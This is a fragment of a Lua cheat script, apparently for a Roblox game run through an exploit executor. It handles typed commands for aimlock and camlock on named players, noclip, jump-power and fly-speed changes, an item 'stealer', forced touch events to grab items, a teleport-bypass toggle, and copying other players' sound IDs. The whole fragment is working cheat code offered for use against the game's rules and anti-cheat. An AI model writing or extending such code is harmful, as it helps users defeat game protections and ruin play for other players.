			elseif args[1] == "tpmode" then
				ONteleport = not ONteleport
				if ONteleport then
					Notify("Notification", "Changed teleport mode to 2", 5)
				else
					Notify("Notification", "Changed teleport mode to 1", 5)
				end
			elseif args[1] == "stealer" then
				MainFrame.Visible = not MainFrame.Visible
				Notify("Notification", "Toggled stealer", 5)
			elseif args[1] == "noclip" then
				Noclip()
				if ONnoclip then
					Notify("Notification", "Turned on noclip", 5)
				else
					Notify("Notification", "Turned off noclip", 5)
				end
			elseif args[1] == "jp" and args[2] ~= nil then
				local jumpval = args[2]:match("%d+")
				if jumpval ~= "" and not ONlegit then
					plr.Character:WaitForChild"Humanoid".JumpPower = jumpval
					jumppower = jumpval
					Notify("Notification", "Jump power has been set to ".. jumppower, 5)
				elseif ONlegit then
					Notify("Notification", "Turn off legit mode to change jumppower", 5)
				end
			elseif args[1] == "antife" then
				if plr.Character:FindFirstChild"Right Arm" then
					plr.Character["Right Arm"]:Destroy()
				end
				Notify("Notification", "Turned on anti fe loop", 5)
			elseif args[1] == "copy" and args[2] ~= nil then
				local VICTIM = args[2]:lower()

				for i, p in pairs(plrs:GetPlayers()) do
					if p.Name:sub(1, #VICTIM):lower() == VICTIM then
						for j, c in pairs(p.Character:GetDescendants()) do
							if c:IsA"Sound" and (c.Name == "Song" or c.Name == "SoundX" or c.Parent.Name == "Handle") then
								local Clipboard = toclipboard or setclipboard or clipboard
								Clipboard(tostring(c.SoundId))
								Notify("Notification", "Copied ID to clipboard", 5)
								break
							end
						end
					end
				end
			elseif args[1] == "a" and args[2] ~= nil then
				local p = getPlayer(args[2]:lower())
				if p then
					ONshoot = false
					aimtarget = p
					ONaim = true
					Notify("Notification", "Turned on aimlock. Current target is ".. p.Name, 5)
				end
			elseif args[1] == "una" then
				ONaim = false
				aimtarget = nil
				Notify("Notification", "Turned off aimlock", 5)
			elseif (args[1] == "c" or args[1] == "cam") and args[2]~= nil then
				local p = getPlayer(args[2]:lower())
				if p then
					camtarget = p
					Notify("Notification", "Turned on camlock. Current target is ".. p.Name, 5)
					if not ONcamlock then
						ONcamlock = true
						repeat
							if root() and camtarget and camtarget.Character and camtarget.Character:FindFirstChild"Torso" and not camtarget.Character.Torso:FindFirstChild"Bone" then
								workspace.CurrentCamera.CoordinateFrame = CF(root().Position, camtarget.Character.Torso.Position)
							end
							heart:wait()
						until not ONcamlock
					end
				end
			elseif args[1] == "unc" or args[1] == "uncam" then
				ONcamlock = false
				Notify("Notification", "Turned off camlock", 5)
			elseif args[1] == "chatspy" then
				if chatspypos == nil then
					chatspypos = plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position
				end
				plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = not plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible
				if plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position == chatspypos then
					plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = UDim2.new(0, 0, 0, 360)
				else
					plr.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position = chatspypos
				end
			elseif args[1] == "maphide" then
				ONmaphide = not ONmaphide

				if ONmaphide then
					for i, d in pairs(workspace:GetDescendants()) do
						if d.Parent and d.Parent.Parent then
							if d:IsA"BasePart" and not plrs:GetPlayerFromCharacter(d.Parent) and not plrs:GetPlayerFromCharacter(d.Parent.Parent) and d.Name ~= "Terrain" and d.Name ~= "Baseplate" and not d.Parent.Name:find"| %$" then
								table.insert(Parts, {d, d.Parent})
								d.Parent = rep
							end
						elseif d:IsA"BasePart" and not plrs:GetPlayerFromCharacter(d.Parent) and d.Name ~= "Terrain" and d.Name ~= "Baseplate" and not d.Parent.Name:find"| %$" then
							table.insert(Parts, {d, d.Parent})
							d.Parent = rep
						end
					end
					Notify("Notification", "Hid the map", 5)
				else
					for i = 1, #Parts do
						Parts[i][1].Parent = Parts[i][2]
					end
					Notify("Notification", "Unhid the map", 5)
				end
			elseif args[1] == "fs" and args[2] ~= nil then
				local fs = args[2]:match"%d+"
				if fs ~= "" then
					flyspeed = tonumber(fs)
				end
				Notify("Notification", "Set fly speed to ".. args[2], 5)
			elseif args[1] == "av" and args[2] ~= nil then
				local av = args[2]:match"%d+"
				if av ~= "" then
					aimvelocity = tonumber(av)
				end
				Notify("Notification", "Set aimbot velocity to ".. args[2], 5)
			elseif args[1] == "rbullets" then
				ONrainbowbullets = not ONrainbowbullets
				if ONrainbowbullets then
					rainbowbullets(plr.Character:FindFirstChildOfClass"Humanoid")
					Notify("Notification", "Turned on rainbow bullets", 5)
				else
					if rainbowbulletscon then
						rainbowbulletscon:Disconnect()
					end
					Notify("Notification", "Turned off rainbow bullets", 5)
				end
			elseif args[1] == "rtrails" then
				ONrainbowtrails = not ONrainbowtrails
				if ONrainbowtrails then
					rainbowtrails(plr.Character:FindFirstChildOfClass"Humanoid")
					Notify("Notification", "Turned on rainbow trails", 5)
				else
					if rainbowtrailscon then
						rainbowtrailscon:Disconnect()
					end
					Notify("Notification", "Turned off rainbow trails", 5)
				end
			elseif args[1] == "hitmarkers" and game.PlaceId == 4669040 then
				ONhitmarker = not ONhitmarker
				if ONhitmarker then
					Notify("Notification", "Turned on hitmarkers", 5)
				else
					Notify("Notification", "Turned off hitmarkers", 5)
				end
			elseif args[1] == "vest" and args[2] ~= nil then
				local p = getPlayer(args[2]:lower())
				if p and p.Character and p.Character:FindFirstChild"Torso" then
					if p.Character:FindFirstChild"BulletResist" then
						Notify("Yep", p.Name.. " has vest", 5)
					else
						Notify("Nope", p.Name.. " doesn't have vest", 5)
					end
				end
			elseif args[1] == "get" and args[2] ~= nil then
				if itemnames[args[2]] then
					local temppos = root().Position
					for j = 1, (args[3] or 1) do
						local last = math.huge
						local item

						for i = 1, #items do
							if items[i].Name == itemnames[args[2]] then
								local distance = (plr.Character.Torso.Position - items[i].Head.Position).magnitude

								if distance < last then
									last = distance
									item = items[i]
								end
							end
						end
						repeat
							root().CFrame = item.Head.CFrame
							firetouchinterest(plr.Character.Torso, item.Head, 0)
							firetouchinterest(plr.Character.Torso, item.Head, 1)
							heart:wait()
						until not item.Name:find" | "
					end
					root().CFrame = CF(temppos)
					
					--[[
					Teleport(item.Head.Position, true)
					wait(0.1)
					Teleport(temppos, true)
					]]--
				end
			elseif args[1] == "tpbypasstest" then
				ONtpbypass = not ONtpbypass
				plr.Character:BreakJoints()
				if ONtpbypass then
					Notify("Notification", "Turned on tpbypass", 5)
				else
					Notify("Notification", "Turned off tpbypass", 5)
				end
			end
		end
	end)
end)
Notify("Loaded", "Script took ".. tostring(math.floor((tick() - start) * 10)/10).. " seconds to load", 5, "rbxassetid://4904940731")
